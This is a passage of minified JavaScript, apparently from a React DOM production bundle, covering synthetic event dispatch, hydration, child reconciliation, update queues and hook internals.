K(N,Z,null,o,F),z.push({event:N,listeners:ee}))}}if((n&7)===0){e:{if(N=e==="mouseover"||e==="pointerover",K=e==="mouseout"||e==="pointerout",N&&o!==va&&(Z=o.relatedTarget||o.fromElement)&&(Wn(Z)||Z[Zt]))break e;if((K||N)&&(N=F.window===F?F:(N=F.ownerDocument)?N.defaultView||N.parentWindow:window,K?(Z=o.relatedTarget||o.toElement,K=j,Z=Z?Wn(Z):null,Z!==null&&(Ve=Un(Z),Z!==Ve||Z.tag!==5&&Z.tag!==6)&&(Z=null)):(K=null,Z=j),K!==Z)){if(ee=Su,V="onMouseLeave",_="onMouseEnter",I="mouse",(e==="pointerout"||e==="pointerover")&&(ee=Cu,V="onPointerLeave",_="onPointerEnter",I="pointer"),Ve=K==null?N:Pi(K),D=Z==null?N:Pi(Z),N=new ee(V,I+"leave",K,o,F),N.target=Ve,N.relatedTarget=D,V=null,Wn(F)===j&&(ee=new ee(_,I+"enter",Z,o,F),ee.target=D,ee.relatedTarget=Ve,V=ee),Ve=V,K&&Z)t:{for(ee=K,_=Z,I=0,D=ee;D;D=Ci(D))I++;for(D=0,V=_;V;V=Ci(V))D++;for(;0<I-D;)ee=Ci(ee),I--;for(;0<D-I;)_=Ci(_),D--;for(;I--;){if(ee===_||_!==null&&ee===_.alternate)break t;ee=Ci(ee),_=Ci(_)}ee=null}else ee=null;K!==null&&Zu(z,N,K,ee,!1),Z!==null&&Ve!==null&&Zu(z,Ve,Z,ee,!0)}}e:{if(N=j?Pi(j):window,K=N.nodeName&&N.nodeName.toLowerCase(),K==="select"||K==="input"&&N.type==="file")var ne=Xb;else if(Du(N))if(ju)ne=nv;else{ne=ev;var re=Zb}else(K=N.nodeName)&&K.toLowerCase()==="input"&&(N.type==="checkbox"||N.type==="radio")&&(ne=tv);if(ne&&(ne=ne(e,j))){Mu(z,ne,o,F);break e}re&&re(e,N,j),e==="focusout"&&(re=N._wrapperState)&&re.controlled&&N.type==="number"&&fa(N,"number",N.value)}switch(re=j?Pi(j):window,e){case"focusin":(Du(re)||re.contentEditable==="true")&&(Si=re,Wa=j,Ar=null);break;case"focusout":Ar=Wa=Si=null;break;case"mousedown":$a=!0;break;case"contextmenu":case"mouseup":case"dragend":$a=!1,Uu(z,o,F);break;case"selectionchange":if(sv)break;case"keydown":case"keyup":Uu(z,o,F)}var se;if(Fa)e:{switch(e){case"compositionstart":var ce="onCompositionStart";break e;case"compositionend":ce="onCompositionEnd";break e;case"compositionupdate":ce="onCompositionUpdate";break e}ce=void 0}else Ti?_u(e,o)&&(ce="onCompositionEnd"):e==="keydown"&&o.keyCode===229&&(ce="onCompositionStart");ce&&(Eu&&o.locale!=="ko"&&(Ti||ce!=="onCompositionStart"?ce==="onCompositionEnd"&&Ti&&(se=xu()):(yn=F,Ma="value"in yn?yn.value:yn.textContent,Ti=!0)),re=Ns(j,ce),0<re.length&&(ce=new Au(ce,e,null,o,F),z.push({event:ce,listeners:re}),se?ce.data=se:(se=Ru(o),se!==null&&(ce.data=se)))),(se=qb?Kb(e,o):Jb(e,o))&&(j=Ns(j,"onBeforeInput"),0<j.length&&(F=new Au("onBeforeInput","beforeinput",null,o,F),z.push({event:F,listeners:j}),F.data=se))}Yu(z,n)})}function Pr(e,n,o){return{instance:e,listener:n,currentTarget:o}}function Ns(e,n){for(var o=n+"Capture",l=[];e!==null;){var u=e,g=u.stateNode;u.tag===5&&g!==null&&(u=g,g=cr(e,o),g!=null&&l.unshift(Pr(e,g,u)),g=cr(e,n),g!=null&&l.push(Pr(e,g,u))),e=e.return}return l}function Ci(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function Zu(e,n,o,l,u){for(var g=n._reactName,b=[];o!==null&&o!==l;){var k=o,A=k.alternate,j=k.stateNode;if(A!==null&&A===l)break;k.tag===5&&j!==null&&(k=j,u?(A=cr(o,g),A!=null&&b.unshift(Pr(o,A,k))):u||(A=cr(o,g),A!=null&&b.push(Pr(o,A,k)))),o=o.return}b.length!==0&&e.push({event:n,listeners:b})}var cv=/\r\n?/g,dv=/\u0000|\uFFFD/g;function eh(e){return(typeof e=="string"?e:""+e).replace(cv,`
`).replace(dv,"")}function Fs(e,n,o){if(n=eh(n),eh(e)!==n&&o)throw Error(r(425))}function zs(){}var Qa=null,Ya=null;function Xa(e,n){return e==="textarea"||e==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var Za=typeof setTimeout=="function"?setTimeout:void 0,uv=typeof clearTimeout=="function"?clearTimeout:void 0,th=typeof Promise=="function"?Promise:void 0,hv=typeof queueMicrotask=="function"?queueMicrotask:typeof th<"u"?function(e){return th.resolve(null).then(e).catch(pv)}:Za;function pv(e){setTimeout(function(){throw e})}function el(e,n){var o=n,l=0;do{var u=o.nextSibling;if(e.removeChild(o),u&&u.nodeType===8)if(o=u.data,o==="/$"){if(l===0){e.removeChild(u),br(n);return}l--}else o!=="$"&&o!=="$?"&&o!=="$!"||l++;o=u}while(o);br(n)}function vn(e){for(;e!=null;e=e.nextSibling){var n=e.nodeType;if(n===1||n===3)break;if(n===8){if(n=e.data,n==="$"||n==="$!"||n==="$?")break;if(n==="/$")return null}}return e}function nh(e){e=e.previousSibling;for(var n=0;e;){if(e.nodeType===8){var o=e.data;if(o==="$"||o==="$!"||o==="$?"){if(n===0)return e;n--}else o==="/$"&&n++}e=e.previousSibling}return null}var Ei=Math.random().toString(36).slice(2),qt="__reactFiber$"+Ei,Ir="__reactProps$"+Ei,Zt="__reactContainer$"+Ei,tl="__reactEvents$"+Ei,fv="__reactListeners$"+Ei,gv="__reactHandles$"+Ei;function Wn(e){var n=e[qt];if(n)return n;for(var o=e.parentNode;o;){if(n=o[Zt]||o[qt]){if(o=n.alternate,n.child!==null||o!==null&&o.child!==null)for(e=nh(e);e!==null;){if(o=e[qt])return o;e=nh(e)}return n}e=o,o=e.parentNode}return null}function _r(e){return e=e[qt]||e[Zt],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function Pi(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(r(33))}function Vs(e){return e[Ir]||null}var nl=[],Ii=-1;function wn(e){return{current:e}}function De(e){0>Ii||(e.current=nl[Ii],nl[Ii]=null,Ii--)}function Pe(e,n){Ii++,nl[Ii]=e.current,e.current=n}var kn={},tt=wn(kn),dt=wn(!1),$n=kn;function _i(e,n){var o=e.type.contextTypes;if(!o)return kn;var l=e.stateNode;if(l&&l.__reactInternalMemoizedUnmaskedChildContext===n)return l.__reactInternalMemoizedMaskedChildContext;var u={},g;for(g in o)u[g]=n[g];return l&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=n,e.__reactInternalMemoizedMaskedChildContext=u),u}function ut(e){return e=e.childContextTypes,e!=null}function Us(){De(dt),De(tt)}function ih(e,n,o){if(tt.current!==kn)throw Error(r(168));Pe(tt,n),Pe(dt,o)}function rh(e,n,o){var l=e.stateNode;if(n=n.childContextTypes,typeof l.getChildContext!="function")return o;l=l.getChildContext();for(var u in l)if(!(u in n))throw Error(r(108,Te(e)||"Unknown",u));return q({},o,l)}function Ws(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||kn,$n=tt.current,Pe(tt,e),Pe(dt,dt.current),!0}function sh(e,n,o){var l=e.stateNode;if(!l)throw Error(r(169));o?(e=rh(e,n,$n),l.__reactInternalMemoizedMergedChildContext=e,De(dt),De(tt),Pe(tt,e)):De(dt),Pe(dt,o)}var en=null,$s=!1,il=!1;function oh(e){en===null?en=[e]:en.push(e)}function mv(e){$s=!0,oh(e)}function xn(){if(!il&&en!==null){il=!0;var e=0,n=Se;try{var o=en;for(Se=1;e<o.length;e++){var l=o[e];do l=l(!0);while(l!==null)}en=null,$s=!1}catch(u){throw en!==null&&(en=en.slice(e+1)),lu(Aa,xn),u}finally{Se=n,il=!1}}return null}var Ri=[],Di=0,Hs=null,Gs=0,Ct=[],Et=0,Hn=null,tn=1,nn="";function Gn(e,n){Ri[Di++]=Gs,Ri[Di++]=Hs,Hs=e,Gs=n}function ah(e,n,o){Ct[Et++]=tn,Ct[Et++]=nn,Ct[Et++]=Hn,Hn=e;var l=tn;e=nn;var u=32-Ot(l)-1;l&=~(1<<u),o+=1;var g=32-Ot(n)+u;if(30<g){var b=u-u%5;g=(l&(1<<b)-1).toString(32),l>>=b,u-=b,tn=1<<32-Ot(n)+u|o<<u|l,nn=g+e}else tn=1<<g|o<<u|l,nn=e}function rl(e){e.return!==null&&(Gn(e,1),ah(e,1,0))}function sl(e){for(;e===Hs;)Hs=Ri[--Di],Ri[Di]=null,Gs=Ri[--Di],Ri[Di]=null;for(;e===Hn;)Hn=Ct[--Et],Ct[Et]=null,nn=Ct[--Et],Ct[Et]=null,tn=Ct[--Et],Ct[Et]=null}var vt=null,wt=null,je=!1,Bt=null;function lh(e,n){var o=Rt(5,null,null,0);o.elementType="DELETED",o.stateNode=n,o.return=e,n=e.deletions,n===null?(e.deletions=[o],e.flags|=16):n.push(o)}function ch(e,n){switch(e.tag){case 5:var o=e.type;return n=n.nodeType!==1||o.toLowerCase()!==n.nodeName.toLowerCase()?null:n,n!==null?(e.stateNode=n,vt=e,wt=vn(n.firstChild),!0):!1;case 6:return n=e.pendingProps===""||n.nodeType!==3?null:n,n!==null?(e.stateNode=n,vt=e,wt=null,!0):!1;case 13:return n=n.nodeType!==8?null:n,n!==null?(o=Hn!==null?{id:tn,overflow:nn}:null,e.memoizedState={dehydrated:n,treeContext:o,retryLane:1073741824},o=Rt(18,null,null,0),o.stateNode=n,o.return=e,e.child=o,vt=e,wt=null,!0):!1;default:return!1}}function ol(e){return(e.mode&1)!==0&&(e.flags&128)===0}function al(e){if(je){var n=wt;if(n){var o=n;if(!ch(e,n)){if(ol(e))throw Error(r(418));n=vn(o.nextSibling);var l=vt;n&&ch(e,n)?lh(l,o):(e.flags=e.flags&-4097|2,je=!1,vt=e)}}else{if(ol(e))throw Error(r(418));e.flags=e.flags&-4097|2,je=!1,vt=e}}}function dh(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;vt=e}function qs(e){if(e!==vt)return!1;if(!je)return dh(e),je=!0,!1;var n;if((n=e.tag!==3)&&!(n=e.tag!==5)&&(n=e.type,n=n!=="head"&&n!=="body"&&!Xa(e.type,e.memoizedProps)),n&&(n=wt)){if(ol(e))throw uh(),Error(r(418));for(;n;)lh(e,n),n=vn(n.nextSibling)}if(dh(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(r(317));e:{for(e=e.nextSibling,n=0;e;){if(e.nodeType===8){var o=e.data;if(o==="/$"){if(n===0){wt=vn(e.nextSibling);break e}n--}else o!=="$"&&o!=="$!"&&o!=="$?"||n++}e=e.nextSibling}wt=null}}else wt=vt?vn(e.stateNode.nextSibling):null;return!0}function uh(){for(var e=wt;e;)e=vn(e.nextSibling)}function Mi(){wt=vt=null,je=!1}function ll(e){Bt===null?Bt=[e]:Bt.push(e)}var yv=O.ReactCurrentBatchConfig;function Rr(e,n,o){if(e=o.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(o._owner){if(o=o._owner,o){if(o.tag!==1)throw Error(r(309));var l=o.stateNode}if(!l)throw Error(r(147,e));var u=l,g=""+e;return n!==null&&n.ref!==null&&typeof n.ref=="function"&&n.ref._stringRef===g?n.ref:(n=function(b){var k=u.refs;b===null?delete k[g]:k[g]=b},n._stringRef=g,n)}if(typeof e!="string")throw Error(r(284));if(!o._owner)throw Error(r(290,e))}return e}function Ks(e,n){throw e=Object.prototype.toString.call(n),Error(r(31,e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e))}function hh(e){var n=e._init;return n(e._payload)}function ph(e){function n(_,I){if(e){var D=_.deletions;D===null?(_.deletions=[I],_.flags|=16):D.push(I)}}function o(_,I){if(!e)return null;for(;I!==null;)n(_,I),I=I.sibling;return null}function l(_,I){for(_=new Map;I!==null;)I.key!==null?_.set(I.key,I):_.set(I.index,I),I=I.sibling;return _}function u(_,I){return _=_n(_,I),_.index=0,_.sibling=null,_}function g(_,I,D){return _.index=D,e?(D=_.alternate,D!==null?(D=D.index,D<I?(_.flags|=2,I):D):(_.flags|=2,I)):(_.flags|=1048576,I)}function b(_){return e&&_.alternate===null&&(_.flags|=2),_}function k(_,I,D,V){return I===null||I.tag!==6?(I=Zl(D,_.mode,V),I.return=_,I):(I=u(I,D),I.return=_,I)}function A(_,I,D,V){var ne=D.type;return ne===G?F(_,I,D.props.children,V,D.key):I!==null&&(I.elementType===ne||typeof ne=="object"&&ne!==null&&ne.$$typeof===oe&&hh(ne)===I.type)?(V=u(I,D.props),V.ref=Rr(_,I,D),V.return=_,V):(V=vo(D.type,D.key,D.props,null,_.mode,V),V.ref=Rr(_,I,D),V.return=_,V)}function j(_,I,D,V){return I===null||I.tag!==4||I.stateNode.containerInfo!==D.containerInfo||I.stateNode.implementation!==D.implementation?(I=ec(D,_.mode,V),I.return=_,I):(I=u(I,D.children||[]),I.return=_,I)}function F(_,I,D,V,ne){return I===null||I.tag!==7?(I=ei(D,_.mode,V,ne),I.return=_,I):(I=u(I,D),I.return=_,I)}function z(_,I,D){if(typeof I=="string"&&I!==""||typeof I=="number")return I=Zl(""+I,_.mode,D),I.return=_,I;if(typeof I=="object"&&I!==null){switch(I.$$typeof){case W:return D=vo(I.type,I.key,I.props,null,_.mode,D),D.ref=Rr(_,null,I),D.return=_,D;case J:return I=ec(I,_.mode,D),I.return=_,I;case oe:var V=I._init;return z(_,V(I._payload),D)}if(or(I)||Q(I))return I=ei(I,_.mode,D,null),I.return=_,I;Ks(_,I)}return null}function N(_,I,D,V){var ne=I!==null?I.key:null;if(typeof D=="string"&&D!==""||typeof D=="number")return ne!==null?null:k(_,I,""+D,V);if(typeof D=="object"&&D!==null){switch(D.$$typeof){case W:return D.key===ne?A(_,I,D,V):null;case J:return D.key===ne?j(_,I,D,V):null;case oe:return ne=D._init,N(_,I,ne(D._payload),V)}if(or(D)||Q(D))return ne!==null?null:F(_,I,D,V,null);Ks(_,D)}return null}function K(_,I,D,V,ne){if(typeof V=="string"&&V!==""||typeof V=="number")return _=_.get(D)||null,k(I,_,""+V,ne);if(typeof V=="object"&&V!==null){switch(V.$$typeof){case W:return _=_.get(V.key===null?D:V.key)||null,A(I,_,V,ne);case J:return _=_.get(V.key===null?D:V.key)||null,j(I,_,V,ne);case oe:var re=V._init;return K(_,I,D,re(V._payload),ne)}if(or(V)||Q(V))return _=_.get(D)||null,F(I,_,V,ne,null);Ks(I,V)}return null}function Z(_,I,D,V){for(var ne=null,re=null,se=I,ce=I=0,Ye=null;se!==null&&ce<D.length;ce++){se.index>ce?(Ye=se,se=null):Ye=se.sibling;var ke=N(_,se,D[ce],V);if(ke===null){se===null&&(se=Ye);break}e&&se&&ke.alternate===null&&n(_,se),I=g(ke,I,ce),re===null?ne=ke:re.sibling=ke,re=ke,se=Ye}if(ce===D.length)return o(_,se),je&&Gn(_,ce),ne;if(se===null){for(;ce<D.length;ce++)se=z(_,D[ce],V),se!==null&&(I=g(se,I,ce),re===null?ne=se:re.sibling=se,re=se);return je&&Gn(_,ce),ne}for(se=l(_,se);ce<D.length;ce++)Ye=K(se,_,ce,D[ce],V),Ye!==null&&(e&&Ye.alternate!==null&&se.delete(Ye.key===null?ce:Ye.key),I=g(Ye,I,ce),re===null?ne=Ye:re.sibling=Ye,re=Ye);return e&&se.forEach(function(Rn){return n(_,Rn)}),je&&Gn(_,ce),ne}function ee(_,I,D,V){var ne=Q(D);if(typeof ne!="function")throw Error(r(150));if(D=ne.call(D),D==null)throw Error(r(151));for(var re=ne=null,se=I,ce=I=0,Ye=null,ke=D.next();se!==null&&!ke.done;ce++,ke=D.next()){se.index>ce?(Ye=se,se=null):Ye=se.sibling;var Rn=N(_,se,ke.value,V);if(Rn===null){se===null&&(se=Ye);break}e&&se&&Rn.alternate===null&&n(_,se),I=g(Rn,I,ce),re===null?ne=Rn:re.sibling=Rn,re=Rn,se=Ye}if(ke.done)return o(_,se),je&&Gn(_,ce),ne;if(se===null){for(;!ke.done;ce++,ke=D.next())ke=z(_,ke.value,V),ke!==null&&(I=g(ke,I,ce),re===null?ne=ke:re.sibling=ke,re=ke);return je&&Gn(_,ce),ne}for(se=l(_,se);!ke.done;ce++,ke=D.next())ke=K(se,_,ce,ke.value,V),ke!==null&&(e&&ke.alternate!==null&&se.delete(ke.key===null?ce:ke.key),I=g(ke,I,ce),re===null?ne=ke:re.sibling=ke,re=ke);return e&&se.forEach(function(Qv){return n(_,Qv)}),je&&Gn(_,ce),ne}function Ve(_,I,D,V){if(typeof D=="object"&&D!==null&&D.type===G&&D.key===null&&(D=D.props.children),typeof D=="object"&&D!==null){switch(D.$$typeof){case W:e:{for(var ne=D.key,re=I;re!==null;){if(re.key===ne){if(ne=D.type,ne===G){if(re.tag===7){o(_,re.sibling),I=u(re,D.props.children),I.return=_,_=I;break e}}else if(re.elementType===ne||typeof ne=="object"&&ne!==null&&ne.$$typeof===oe&&hh(ne)===re.type){o(_,re.sibling),I=u(re,D.props),I.ref=Rr(_,re,D),I.return=_,_=I;break e}o(_,re);break}else n(_,re);re=re.sibling}D.type===G?(I=ei(D.props.children,_.mode,V,D.key),I.return=_,_=I):(V=vo(D.type,D.key,D.props,null,_.mode,V),V.ref=Rr(_,I,D),V.return=_,_=V)}return b(_);case J:e:{for(re=D.key;I!==null;){if(I.key===re)if(I.tag===4&&I.stateNode.containerInfo===D.containerInfo&&I.stateNode.implementation===D.implementation){o(_,I.sibling),I=u(I,D.children||[]),I.return=_,_=I;break e}else{o(_,I);break}else n(_,I);I=I.sibling}I=ec(D,_.mode,V),I.return=_,_=I}return b(_);case oe:return re=D._init,Ve(_,I,re(D._payload),V)}if(or(D))return Z(_,I,D,V);if(Q(D))return ee(_,I,D,V);Ks(_,D)}return typeof D=="string"&&D!==""||typeof D=="number"?(D=""+D,I!==null&&I.tag===6?(o(_,I.sibling),I=u(I,D),I.return=_,_=I):(o(_,I),I=Zl(D,_.mode,V),I.return=_,_=I),b(_)):o(_,I)}return Ve}var ji=ph(!0),fh=ph(!1),Js=wn(null),Qs=null,Oi=null,cl=null;function dl(){cl=Oi=Qs=null}function ul(e){var n=Js.current;De(Js),e._currentValue=n}function hl(e,n,o){for(;e!==null;){var l=e.alternate;if((e.childLanes&n)!==n?(e.childLanes|=n,l!==null&&(l.childLanes|=n)):l!==null&&(l.childLanes&n)!==n&&(l.childLanes|=n),e===o)break;e=e.return}}function Li(e,n){Qs=e,cl=Oi=null,e=e.dependencies,e!==null&&e.firstContext!==null&&((e.lanes&n)!==0&&(ht=!0),e.firstContext=null)}function Pt(e){var n=e._currentValue;if(cl!==e)if(e={context:e,memoizedValue:n,next:null},Oi===null){if(Qs===null)throw Error(r(308));Oi=e,Qs.dependencies={lanes:0,firstContext:e}}else Oi=Oi.next=e;return n}var qn=null;function pl(e){qn===null?qn=[e]:qn.push(e)}function gh(e,n,o,l){var u=n.interleaved;return u===null?(o.next=o,pl(n)):(o.next=u.next,u.next=o),n.interleaved=o,rn(e,l)}function rn(e,n){e.lanes|=n;var o=e.alternate;for(o!==null&&(o.lanes|=n),o=e,e=e.return;e!==null;)e.childLanes|=n,o=e.alternate,o!==null&&(o.childLanes|=n),o=e,e=e.return;return o.tag===3?o.stateNode:null}var Tn=!1;function fl(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function mh(e,n){e=e.updateQueue,n.updateQueue===e&&(n.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function sn(e,n){return{eventTime:e,lane:n,tag:0,payload:null,callback:null,next:null}}function Sn(e,n,o){var l=e.updateQueue;if(l===null)return null;if(l=l.shared,(we&2)!==0){var u=l.pending;return u===null?n.next=n:(n.next=u.next,u.next=n),l.pending=n,rn(e,o)}return u=l.interleaved,u===null?(n.next=n,pl(l)):(n.next=u.next,u.next=n),l.interleaved=n,rn(e,o)}function Ys(e,n,o){if(n=n.updateQueue,n!==null&&(n=n.shared,(o&4194240)!==0)){var l=n.lanes;l&=e.pendingLanes,o|=l,n.lanes=o,Pa(e,o)}}function yh(e,n){var o=e.updateQueue,l=e.alternate;if(l!==null&&(l=l.updateQueue,o===l)){var u=null,g=null;if(o=o.firstBaseUpdate,o!==null){do{var b={eventTime:o.eventTime,lane:o.lane,tag:o.tag,payload:o.payload,callback:o.callback,next:null};g===null?u=g=b:g=g.next=b,o=o.next}while(o!==null);g===null?u=g=n:g=g.next=n}else u=g=n;o={baseState:l.baseState,firstBaseUpdate:u,lastBaseUpdate:g,shared:l.shared,effects:l.effects},e.updateQueue=o;return}e=o.lastBaseUpdate,e===null?o.firstBaseUpdate=n:e.next=n,o.lastBaseUpdate=n}function Xs(e,n,o,l){var u=e.updateQueue;Tn=!1;var g=u.firstBaseUpdate,b=u.lastBaseUpdate,k=u.shared.pending;if(k!==null){u.shared.pending=null;var A=k,j=A.next;A.next=null,b===null?g=j:b.next=j,b=A;var F=e.alternate;F!==null&&(F=F.updateQueue,k=F.lastBaseUpdate,k!==b&&(k===null?F.firstBaseUpdate=j:k.next=j,F.lastBaseUpdate=A))}if(g!==null){var z=u.baseState;b=0,F=j=A=null,k=g;do{var N=k.lane,K=k.eventTime;if((l&N)===N){F!==null&&(F=F.next={eventTime:K,lane:0,tag:k.tag,payload:k.payload,callback:k.callback,next:null});e:{var Z=e,ee=k;switch(N=n,K=o,ee.tag){case 1:if(Z=ee.payload,typeof Z=="function"){z=Z.call(K,z,N);break e}z=Z;break e;case 3:Z.flags=Z.flags&-65537|128;case 0:if(Z=ee.payload,N=typeof Z=="function"?Z.call(K,z,N):Z,N==null)break e;z=q({},z,N);break e;case 2:Tn=!0}}k.callback!==null&&k.lane!==0&&(e.flags|=64,N=u.effects,N===null?u.effects=[k]:N.push(k))}else K={eventTime:K,lane:N,tag:k.tag,payload:k.payload,callback:k.callback,next:null},F===null?(j=F=K,A=z):F=F.next=K,b|=N;if(k=k.next,k===null){if(k=u.shared.pending,k===null)break;N=k,k=N.next,N.next=null,u.lastBaseUpdate=N,u.shared.pending=null}}while(!0);if(F===null&&(A=z),u.baseState=A,u.firstBaseUpdate=j,u.lastBaseUpdate=F,n=u.shared.interleaved,n!==null){u=n;do b|=u.lane,u=u.next;while(u!==n)}else g===null&&(u.shared.lanes=0);Qn|=b,e.lanes=b,e.memoizedState=z}}function bh(e,n,o){if(e=n.effects,n.effects=null,e!==null)for(n=0;n<e.length;n++){var l=e[n],u=l.callback;if(u!==null){if(l.callback=null,l=o,typeof u!="function")throw Error(r(191,u));u.call(l)}}}var Dr={},Kt=wn(Dr),Mr=wn(Dr),jr=wn(Dr);function Kn(e){if(e===Dr)throw Error(r(174));return e}function gl(e,n){switch(Pe(jr,n),Pe(Mr,e),Pe(Kt,Dr),e=n.nodeType,e){case 9:case 11:n=(n=n.documentElement)?n.namespaceURI:ma(null,"");break;default:e=e===8?n.parentNode:n,n=e.namespaceURI||null,e=e.tagName,n=ma(n,e)}De(Kt),Pe(Kt,n)}function Bi(){De(Kt),De(Mr),De(jr)}function vh(e){Kn(jr.current);var n=Kn(Kt.current),o=ma(n,e.type);n!==o&&(Pe(Mr,e),Pe(Kt,o))}function ml(e){Mr.current===e&&(De(Kt),De(Mr))}var Oe=wn(0);function Zs(e){for(var n=e;n!==null;){if(n.tag===13){var o=n.memoizedState;if(o!==null&&(o=o.dehydrated,o===null||o.data==="$?"||o.data==="$!"))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!==void 0){if((n.flags&128)!==0)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var yl=[];function bl(){for(var e=0;e<yl.length;e++)yl[e]._workInProgressVersionPrimary=null;yl.length=0}var eo=O.ReactCurrentDispatcher,vl=O.ReactCurrentBatchConfig,Jn=0,Le=null,He=null,Je=null,to=!1,Or=!1,Lr=0,bv=0;function nt(){throw Error(r(321))}function wl(e,n){if(n===null)return!1;for(var o=0;o<n.length&&o<e.length;o++)if(!Lt(e[o],n[o]))return!1;return!0}function kl(e,n,o,l,u,g){if(Jn=g,Le=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,eo.current=e===null||e.memoizedState===null?xv:Tv,e=o(l,u),Or){g=0;do{if(Or=!1,Lr=0,25<=g)throw Error(r(301));g+=1,Je=He=null,n.updateQueue=null,eo.current=Sv,e=o(l,u)}while(Or)}if(eo.current=ro,n=He!==null&&He.next!==null,Jn=0,Je=He=Le=null,to=!1,n)throw Error(r(300));return e}function xl(){var e=Lr!==0;return Lr=0,e}function Jt(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return Je===null?Le.memoizedState=Je=e:Je=Je.next=e,Je}function It(){if(He===null){var e=Le.alternate;e=e!==null?e.memoizedState:null}else e=He.next;var n=Je===null?Le.memoizedState:Je.next;if(n!==null)Je=n,He=e;else{if(e===null)throw Error(r(310));He=e,e={memoizedState:He.memoizedState,baseState:He.baseState,baseQueue:He.baseQueue,queue:He.queue,next:null},Je===null?Le.memoizedState=Je=e:Je=Je.next=e}return Je}function Br(e,n){return typeof n=="function"?n(e):n}function Tl(e){var n=It(),o=n.queue;if(o===null)throw Error(r(311));o.lastRenderedReducer=e;var l=He,u=l.baseQueue,g=o.pending;if(g!==null){if(u!==null){var b=u.next;u.next=g.next,g.next=b}l.baseQueue=u=g,o.pending=null}if(u!==null){g=u.next,l=l.baseState;var k=b=null,A=null,j=g;do{var F=j.lane;if((Jn&F)===F)A!==null&&(A=A.next={lane:0,action:j.action,hasEagerState:j.hasEagerState,eagerState:j.eagerState,next:null}),l=j.hasEagerState?j.eagerState:e(l,j.action);else{var z={lane:F,action:j.action,hasEagerState:j.hasEagerState,eagerState:j.eagerState,next:null};A===null?(k=A=z,b=l):A=A.next=z,Le.lanes|=F,Qn|=F}j=j.next}while(j!==null&&j!==g);A===null?b=l:A.next=k,Lt(l,n.memoizedState)||(ht=!0),n.memoizedState=l,n.baseState=b,n.baseQueue=A,o.lastRenderedState=l}if(e=o.interleaved,e!==null){u=e;do g=u.lane,Le.lanes|=g,Qn|=g,u=u.next;while(u!==e)}else u===null&&(o.lanes=0);return[n.memoizedState,o.dispatch]}function Sl(e){var n=It(),o=n.queue;if(o===null)throw Error(r(311));o.lastRenderedReducer=e;var l=o.dispatch,u=o.pending,g=n.memoizedState;if(u!==null){o.pending=null;var b=u=u.next;do g=e(g,b.action),b=b.next;while(b!==u);Lt(g,n.memoizedState)||(ht=!0),n.memoizedState=g,n.baseQueue===null&&(n.baseState=g),o.lastRenderedState=g}return[g,l]}function wh(){}function kh(e,n){var o=Le,l=It(),u=n(),g=!Lt(l.memoizedState,u);if(g&&(l.memoizedState=u,ht=!0),l=l.queue,Al(Sh.bind(null,o,l,e),[e]),l.getSnapshot!==n||g||Je!==null&&Je.memoizedState.tag&1){if(o.flags|=2048,Nr(9,Th.bind(null,o,l,u,n),void 0,null),Qe===null)throw Error(r(349));(Jn&30)!==0||xh(o,n,u)}return u}function xh(e,n,o){e.flags|=16384,e={getSnapshot:n,value:o},n=Le.updateQueue,n===null?(n={lastEffect:null,stores:null},Le.updateQueue=n,n.stores=[e]):(o=n.stores,o===null?n.stores=[e]:o.push(e))}function Th(e,n,o,l){n.value=o,n.getSnapshot=l,Ah(n)&&Ch(e)}function Sh(e,n,o){return o(function(){Ah(n)&&Ch(e)})}function Ah(e){var n=e.getSnapshot;e=e.value;try{var o=n();return!Lt(e,o)}catch{return!0}}function Ch(e){var n=rn(e,1);n!==null&&Vt(n,e,1,-1)}function Eh(e){var n=Jt();return typeof e=="function"&&(e=e()),n.memoizedState=n.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Br,lastRenderedState:e},n.queue=e,e=e.dispatch=kv.bind(null,Le,e),[n.memoizedState,e]}function Nr(e,n,o,l){return e={tag:e,create:n,destroy:o,deps:l,next:null},n=Le.updateQueue,n===null?(n={lastEffect:null,stores:null},Le.updateQueue=n,n.lastEffect=e.next=e):(o=n.lastEffect,o===null?n.lastEffect=e.next=e:(l=o.next,o.next=e,e.next=l,n.lastEffect=e)),e}function Ph(){return It().memoizedState}function no(e,n,o,l){var u=Jt();Le.flags|=e,u.memoizedState=Nr(1|n,o,void 0,l===void 0?null:l)}function io(e,n,o,l){var u=It();l=l===void 0?null:l;var g=void 0;if(He!==null){var b=He.memoizedState;if(g=b.destroy,l!==null&&wl(l,b.deps)){u.memoizedState=Nr(n,o,g,l);return}}Le.flags|=e,u.memoizedState=Nr(1|n,o,g,l)}function Ih(e,n){return no(8390656,8,e,n)}function Al(e,n){return io(2048,8,e,n)}function _h(e,n){return io(4,2,e,n)}function Rh(e,n){return io(4,4,e,n)}function Dh(e,n){if(typeof n=="function")return e=e(),n(e),function(){n(null)};if(n!=null)return e=e(),n.current=e,function(){n.current=null}}function Mh(e,n,o){return o=o!=null?o.concat([e]):null,io(4,4,Dh.bind(null,n,e),o)}function Cl(){}function jh(e,n){var o=It();n=n===void 0?null:n;var l=o.memoizedState;return l!==null&&n!==null&&wl(n,l[1])?l[0]:(o.memoizedState=[e,n],e)}function Oh(e,n){var o=It();n=n===void 0?null:n;var l=o.memoizedState;return 